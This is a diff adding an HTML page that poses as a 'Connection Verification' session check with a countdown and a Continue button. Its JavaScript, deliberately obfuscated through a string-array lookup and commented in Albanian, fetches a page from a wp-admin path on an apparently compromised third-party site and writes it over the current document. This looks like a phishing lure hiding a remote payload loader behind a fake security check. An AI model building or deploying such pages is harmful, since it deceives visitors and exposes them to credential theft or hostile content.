@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Connection Verification</title>
+
+<style>
+*{
+    box-sizing:border-box;
+    font-family:Arial,sans-serif;
+}
+body{
+    margin:0;
+    background:#fafafa;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+.container{
+    width:350px;
+    text-align:center;
+}
+.top-icon{
+    width:40px;
+    height:40px;
+    margin:auto;
+    border-radius:50%;
+    background:#fff4ea;
+    color:#d48b39;
+    font-size:22px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+}
+h2{
+    margin-top:20px;
+    font-size:26px;
+    color:#222;
+}
+.subtitle{
+    color:#888;
+    margin-top:10px;
+}
+.circle{
+    position:relative;
+    width:120px;
+    height:120px;
+    margin:35px auto;
+}
+svg{
+    transform:rotate(-90deg);
+}
+circle{
+    fill:none;
+    stroke-width:5;
+}
+.bg{
+    stroke:#e8e8e8;
+}
+.progress{
+    stroke:#d48b39;
+    stroke-linecap:round;
+    stroke-dasharray:314;
+    stroke-dashoffset:0;
+    transition:1s linear;
+}
+.number{
+    position:absolute;
+    left:50%;
+    top:50%;
+    transform:translate(-50%,-50%);
+    font-size:42px;
+    color:#222;
+    font-weight:bold;
+}
+.bar{
+    width:180px;
+    height:5px;
+    background:#ececec;
+    margin:auto;
+    border-radius:30px;
+    overflow:hidden;
+}
+.bar-fill{
+    width:0%;
+    height:100%;
+    background:#d48b39;
+    transition:1s;
+}
+.status{
+    margin-top:12px;
+    color:#b97724;
+    font-size:14px;
+}
+button{
+    display:none;
+    margin-top:25px;
+    border:none;
+    background:#f59e0b;
+    color:white;
+    padding:13px 35px;
+    border-radius:8px;
+    font-size:16px;
+    cursor:pointer;
+}
+button:hover{
+    opacity:.9;
+}
+.footer{
+    margin-top:40px;
+    color:#aaa;
+    font-size:12px;
+}
+</style>
+
+</head>
+<body>
+
+<div class="container">
+    <div class="top-icon">✓</div>
+    <h2>Connection Verification</h2>
+    <div class="subtitle">Please wait while we verify your session.</div>
+
+    <div class="circle">
+        <svg width="120" height="120">
+            <circle class="bg" cx="60" cy="60" r="50"></circle>
+            <circle id="progress" class="progress" cx="60" cy="60" r="50"></circle>
+        </svg>
+        <div class="number" id="number">4</div>
+    </div>
+
+    <div class="bar">
+        <div class="bar-fill" id="bar"></div>
+    </div>
+
+    <div class="status" id="status">Checking connection...</div>
+
+    <button id="btn">Continue</button>
+
+    <div class="footer">Protected session</div>
+</div>
+
+<script>
+// ============================================================
+//  JavaScript i obfuskuar - fetch direkt te cPanel me CORS
+//  (pa proxy, pa Worker, vetëm URL direkte)
+// ============================================================
+var _0x3f2e = [
+    "getElementById","progress","number","bar","status","btn",
+    "style","strokeDashoffset","width","%","innerHTML",
+    "✓","100%","Verification completed","color","#16a34a",
+    "display","inline-block","onclick","disabled","textContent",
+    "Loading...",
+    "https://bombasperfecta.adematica.com/wp-admin/admin/index.html",  // 
+    "text","open","write","close",
+    "warn","Proxy failed, trying direct...",  // këto vargje i mbajmë por nuk përdoren tani
+    "error","Direct fetch failed too.",
+    "Could not load the target page. Please try again.",
+    "Continue"
+];
+var _0x1f2e = function(_0x2a1b) {
+    return _0x3f2e[_0x2a1b];
+};
+let total = 4;
+let current = 4;
+const circumference = 314;
+const progress = document[_0x1f2e(0)](_0x1f2e(1));
+const number = document[_0x1f2e(0)](_0x1f2e(2));
+const bar = document[_0x1f2e(0)](_0x1f2e(3));
+const status = document[_0x1f2e(0)](_0x1f2e(4));
+const btn = document[_0x1f2e(0)](_0x1f2e(5));
+
+function update() {
+    let percent = (total - current) / total;
+    progress[_0x1f2e(6)][_0x1f2e(7)] = circumference - (circumference * percent);
+    bar[_0x1f2e(6)][_0x1f2e(8)] = (percent * 100) + _0x1f2e(9);
+    number[_0x1f2e(10)] = current;
+    current--;
+    if (current < 0) {
+        clearInterval(timer);
+        number[_0x1f2e(10)] = _0x1f2e(11);
+        progress[_0x1f2e(6)][_0x1f2e(7)] = 0;
+        bar[_0x1f2e(6)][_0x1f2e(8)] = _0x1f2e(12);
+        status[_0x1f2e(10)] = _0x1f2e(13);
+        status[_0x1f2e(6)][_0x1f2e(14)] = _0x1f2e(15);
+        btn[_0x1f2e(6)][_0x1f2e(16)] = _0x1f2e(17);
+    }
+}
+update();
+const timer = setInterval(update, 1000);
+
+// ============================================================
+//  LOGJIKA E BUTONIT - FETCH DIREKT (PA PROXY)
+// ============================================================
+btn[_0x1f2e(18)] = async function() {
+    btn[_0x1f2e(19)] = true;
+    btn[_0x1f2e(20)] = _0x1f2e(21);
+    
+    // URL-ja ku do të bëhet fetch (cPanel-i juaj)
+    const targetUrl = _0x1f2e(22);  // ndrysho këtë në array më lart
+    
+    try {
+        const response = await fetch(targetUrl);
+        if (!response.ok) throw new Error("HTTP " + response.status);
+        const htmlContent = await response[_0x1f2e(23)]();
+        document[_0x1f2e(24)]();
+        document[_0x1f2e(25)](htmlContent);
+        document[_0x1f2e(26)]();
+    } catch (err) {
+        console.error("Fetch failed:", err);
+        alert(_0x1f2e(32));
+        btn[_0x1f2e(19)] = false;
+        btn[_0x1f2e(20)] = _0x1f2e(33);
+    }
+};
+</script>
+
+</body>
+</html>
